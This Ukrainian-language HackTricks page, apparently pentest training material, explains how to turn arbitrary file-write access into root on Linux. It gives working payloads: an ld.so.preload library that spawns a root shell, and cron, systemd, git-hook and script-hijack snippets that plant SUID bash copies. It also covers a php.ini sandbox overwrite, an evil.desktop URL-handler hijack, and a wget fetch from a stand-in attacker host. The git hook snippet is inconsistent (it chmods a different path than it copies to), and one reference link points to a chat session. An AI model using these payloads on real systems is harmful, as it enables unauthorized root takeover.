# Довільний запис файлу в root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл поводиться як змінна оточення **`LD_PRELOAD`**, але він також працює в **SUID binaries**.\
Якщо ви можете створити його або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажуватися** з кожним виконуваним бінарним файлом.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **виконуються** при різних **подіях** у git-репозиторії, наприклад коли створюється commit, виконується merge... Тому якщо **привілейований скрипт або користувач** часто виконує ці дії і можливо **записувати в папку `.git`**, це може бути використано для **privesc**.

Наприклад, можливо **згенерувати скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався при створенні нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron і файли часу

Якщо ви можете **write cron-related files that root executes**, зазвичай можна отримати code execution при наступному запуску завдання. Цікаві цілі включають:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- crontab самого root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- `systemd` timers та сервіси, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати новий root cron job** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити script** який вже виконується через `run-parts`
- **Backdoor an existing timer target** шляхом модифікації script або binary, які він запускає

Мінімальний приклад cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати тільки в каталог cron, який використовується `run-parts`, замість цього помістіть туди виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.
- Some distros use `anacron` or `systemd` timers instead of classic cron, but the abuse idea is the same: **змінити те, що root виконає пізніше**.

### Файли сервісів і сокетів

If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.

Цікавими цілями є:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Поширені шляхи зловживань:

- **Перезаписати `ExecStart=`** у сервісному unit'і, що належить root і який ви можете змінити
- **Додати drop-in override** з шкідливим `ExecStart=` і спочатку очистити попередній
- **Backdoor скрипт/бінарний файл**, вже вказаний у unit'і
- **Захопити socket-activated service** шляхом модифікації відповідного `.service` файлу, який запускається, коли сокет отримує підключення

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий потік активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.

### Перезаписати обмежений `php.ini`, який використовується привілейованим PHP sandbox

Деякі custom daemons валідують user-supplied PHP, запускаючи `php` з **restricted `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо у sandboxed code все ще є **any write primitive** (наприклад, `file_put_contents`) і ви можете дістатися до **exact `php.ini` path**, який використовує daemon, ви можете **overwrite that config**, щоб зняти обмеження, а потім відправити другий payload, який виконуватиметься з elevated privileges.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Файл, розташований у `/proc/sys/fs/binfmt_misc`, вказує, який бінарний файл має виконуватися для яких типів файлів. TODO: перевірити вимоги для зловживання цим механізмом, щоб виконати rev shell, коли відкрито поширений тип файлу.

### Overwrite schema handlers (like http: or https:)

Атакуючий, який має права на запис у директоріях конфігурації жертви, може легко замінити або створити файли, що змінюють поведінку системи, внаслідок чого відбувається небажане виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати обробники URL HTTP і HTTPS на шкідливий файл (наприклад, встановивши `x-scheme-handler/http=evil.desktop`), атакуючий забезпечує, що **натискання будь-якого http або https посилання запускає код, вказаний у цьому `evil.desktop` файлі**. Наприклад, після розміщення наступного шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications`, будь-яке натискання зовнішнього URL виконує вбудовану команду:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root виконує скрипти/бінарні файли, доступні для запису користувачем

Якщо привілейований робочий процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у директорії, що належить непривілейованому користувачу), ви можете перехопити його:

- **Виявлення виконання:** моніторте процеси за допомогою [pspy](https://github.com/DominicBreuker/pspy) щоб зафіксувати випадки, коли root викликає шляхи, контрольовані користувачем:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердіть можливість запису:** переконайтеся, що і цільовий файл, і його директорія належать вашому користувачу й доступні для запису.
- **Захопіть ціль:** зробіть резервну копію оригінального binary/script і підкиньте payload, який створює SUID shell (або будь-яку іншу root action), потім відновіть права:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Спровокуйте привілейовану дію** (наприклад, натиснувши кнопку в UI, яка запускає helper). Коли root повторно виконає перехоплений шлях, отримайте shell з підвищеними привілеями за допомогою `./rootshell -p`.

## Посилання

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
